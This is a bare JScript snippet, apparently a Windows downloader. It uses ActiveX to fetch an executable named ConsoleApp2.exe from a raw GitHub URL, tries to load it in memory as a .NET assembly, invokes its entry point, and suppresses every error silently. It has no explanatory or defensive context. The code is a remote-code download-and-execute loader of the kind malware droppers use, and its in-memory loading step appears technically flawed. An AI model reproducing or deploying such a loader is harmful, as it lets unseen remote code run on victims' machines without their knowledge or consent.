(function(){
    try {
        var xhr = new ActiveXObject("MSXML2.XMLHTTP.6.0");
        xhr.open("GET", "https://raw.githubusercontent.com/andrevital771-debug/Loucura/main/ConsoleApp2.exe", false);
        xhr.send();
        
        if (xhr.status === 200) {
            var bytes = xhr.responseBody;
            var asm = new ActiveXObject("System.Reflection.Assembly");
            var loadedAsm = asm.Load(bytes);
            var entry = loadedAsm.GetEntryPoint();
            
            if (entry.GetParameters().Count > 0) {
                entry.Invoke(null, [[]]);
            } else {
                entry.Invoke(null, null);
            }
        }
    } catch(err) {
        // Silent fail
    }
})();